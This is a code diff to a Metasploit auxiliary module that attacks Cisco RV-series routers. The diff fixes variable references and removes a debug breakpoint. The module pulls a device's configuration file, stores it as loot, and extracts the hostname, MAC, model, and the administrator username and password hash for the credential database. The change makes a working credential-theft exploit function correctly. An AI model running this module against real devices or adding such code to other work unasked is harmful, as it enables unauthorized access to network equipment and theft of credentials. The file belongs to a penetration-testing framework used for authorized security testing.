@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801'],
           ['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']
         ],
-      'DisclosureDate' => 'Jan 24 2019'
+      'DisclosureDate' => 'Jan 24 2019',
       'DefaultOptions' =>
         {
           'SSL'   => true
@@ -76,15 +76,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def parse_config(config)
     # Report loot to database (and store on filesystem)
-    stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, res.body)
-    print_good("Stored configuration (#{res.body.length} bytes) to #{stored_path}")
+    stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, config)
+    print_good("Stored configuration (#{config.length} bytes) to #{stored_path}")
 
     # Report host information to database
-    mac = body.match(/^LANMAC=(.*)/)[1]
+    mac = config.match(/^LANMAC=(.*)/)[1]
     mac = "%s:%s:%s:%s:%s:%s" % [mac[0..1], mac[2..3], mac[4..5],
-                                     mac[6..7], mac[8..9], mac[10..11]]
-    hostname = body.match(/^HOSTNAME=(.*)/)[1]
-    model = body.match(/^MODEL=(.*)/)[1]
+                                 mac[6..7], mac[8..9], mac[10..11]]
+    hostname = config.match(/^HOSTNAME=(.*)/)[1]
+    model = config.match(/^MODEL=(.*)/)[1]
     report_host(host: rhost,
                 mac: mac,
                 name: hostname,
@@ -92,8 +92,8 @@ class MetasploitModule < Msf::Auxiliary
                 os_flavor: model)
 
     # Report password hashes to database
-    user = body.match(/^user (.*)/)[1]
-    hash = body.match(/^password (.*)/)[1]
+    user = config.match(/^user (.*)/)[1]
+    hash = config.match(/^password (.*)/)[1]
     report_cred(user, hash)
   end
 
@@ -112,14 +112,13 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, "Empty response.  Please validate the RHOST and TARGETURI options and try again.")
     elsif res.code != 200
       fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{res.code} response.  Please validate the RHOST and TARGETURI options and try again.")
-    else
-      require 'pry'; binding.pry
-      body = res.body
-      if body.match(/####sysconfig####/)
-        parse_config(body)
-      else body.match(/refresh content='0; url=\/default.htm/)
-        fail_with(Failure::NotVulnerable, "Response suggests device is patched")
-      end
+    end
+
+    body = res.body
+    if body.match(/####sysconfig####/)
+      parse_config(body)
+    else body.match(/refresh content='0; url=\/default.htm/)
+      fail_with(Failure::NotVulnerable, "Response suggests device is patched")
     end
   end
 end
